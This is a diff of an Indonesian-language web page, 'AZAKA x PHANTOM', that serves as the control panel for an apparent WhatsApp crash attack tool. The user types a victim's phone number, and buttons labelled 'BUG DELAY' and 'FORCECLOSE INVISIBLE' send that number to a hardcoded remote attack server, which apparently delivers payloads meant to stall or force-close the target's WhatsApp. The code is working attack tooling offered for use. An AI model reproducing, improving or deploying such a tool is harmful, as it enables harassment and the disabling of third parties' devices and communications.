@@ -8,49 +8,42 @@
     body {
       margin: 0;
       padding: 0;
-      background: url('bg.jpg') no-repeat center center fixed;
-      background-size: cover;
       font-family: sans-serif;
+      background: #000 url('bg.jpg') no-repeat center center fixed;
+      background-size: cover;
       color: white;
       text-align: center;
     }
 
     .container {
-      margin-top: 80px;
+      margin-top: 100px;
       padding: 20px;
-    }
-
-    h1 {
-      font-size: 32px;
-      color: red;
-      margin-bottom: 30px;
     }
 
     input[type="text"] {
       padding: 10px;
+      width: 250px;
+      border-radius: 8px;
       border: none;
-      border-radius: 10px;
-      width: 80%;
-      max-width: 300px;
       margin-bottom: 20px;
     }
 
     .btn {
+      padding: 10px 20px;
       background-color: crimson;
       color: white;
-      padding: 12px 24px;
-      margin: 10px;
       border: none;
-      border-radius: 8px;
-      font-weight: bold;
+      border-radius: 6px;
+      margin: 5px;
       cursor: pointer;
+      font-weight: bold;
     }
 
     .btn:hover {
       background-color: darkred;
     }
 
-    .status {
+    #status {
       margin-top: 30px;
       font-weight: bold;
       color: yellow;
@@ -61,60 +54,56 @@
   <div class="container">
     <h1>AZAKA x PHANTOM</h1>
 
-    <input type="text" id="target" placeholder="Masukkan nomor target (62xxxx)" />
-    <br />
+    <input type="text" id="target" placeholder="Masukkan nomor 62xxxxxxxxxxx" /><br>
 
     <button class="btn" onclick="sendAPI('delay')">BUG DELAY</button>
     <button class="btn" onclick="sendAPI('fcin')">FORCECLOSE INVISIBLE</button>
 
-    <div class="status" id="status">⏳ Mengecek status...</div>
+    <div id="status">⏳ Mengecek status server...</div>
   </div>
 
   <script>
-    function sendAPI(type) {
+    async function sendAPI(type) {
       const number = document.getElementById("target").value.trim();
+      const status = document.getElementById("status");
 
-      if (!number || !number.startsWith("62") || number.length < 10) {
-        alert("Masukkan nomor yang valid, dimulai dengan 62.");
+      if (!number.startsWith("62") || number.length < 10) {
+        alert("❗ Nomor harus valid dan dimulai dengan 62.");
         return;
       }
 
-      let url = "";
-      if (type === "delay") {
-        url = `http://46.101.32.52:2004/evolution?type=delay&chatId=${number}@s.whatsapp.net`;
-      } else if (type === "fcin") {
-        url = `http://46.101.32.52:2004/evolution?type=fcin&chatId=${number}@s.whatsapp.net`;
+      const url = `http://46.101.32.52:2004/evolution?type=${type}&chatId=${number}@s.whatsapp.net`;
+      console.log("🔗 Mengirim ke:", url);
+
+      try {
+        const res = await fetch(url);
+        const data = await res.text();
+        console.log("✅ Respon API:", data);
+        status.innerText = `✅ Berhasil dikirim: ${data}`;
+        status.style.color = "lightgreen";
+      } catch (err) {
+        console.error("❌ Error:", err);
+        status.innerText = "❌ Gagal mengirim. (Periksa koneksi atau izin CORS)";
+        status.style.color = "red";
       }
-
-      console.log("Kirim ke API:", url);
-
-      fetch(url)
-        .then(res => res.text())
-        .then(data => {
-          document.getElementById("status").innerText = `✅ Dikirim: ${data}`;
-        })
-        .catch(err => {
-          console.error("Gagal kirim:", err);
-          document.getElementById("status").innerText = "❌ Gagal mengirim.";
-        });
     }
 
-    function cekStatus() {
-      fetch("http://46.101.32.52:2004/status")
-        .then(res => res.text())
-        .then(data => {
-          const s = document.getElementById("status");
-          if (data.trim() === "true") {
-            s.innerText = "🟢 STATUS: ONLINE";
-            s.style.color = "lightgreen";
-          } else {
-            s.innerText = "🔴 STATUS: OFFLINE";
-            s.style.color = "red";
-          }
-        })
-        .catch(() => {
-          document.getElementById("status").innerText = "⚠️ Tidak bisa cek status";
-        });
+    async function cekStatus() {
+      const status = document.getElementById("status");
+      try {
+        const res = await fetch("http://46.101.32.52:2004/status");
+        const text = await res.text();
+        if (text.trim() === "true") {
+          status.innerText = "🟢 STATUS: ONLINE";
+          status.style.color = "lightgreen";
+        } else {
+          status.innerText = "🔴 STATUS: OFFLINE";
+          status.style.color = "red";
+        }
+      } catch {
+        status.innerText = "⚠️ Tidak bisa menghubungi server";
+        status.style.color = "orange";
+      }
     }
 
     cekStatus();
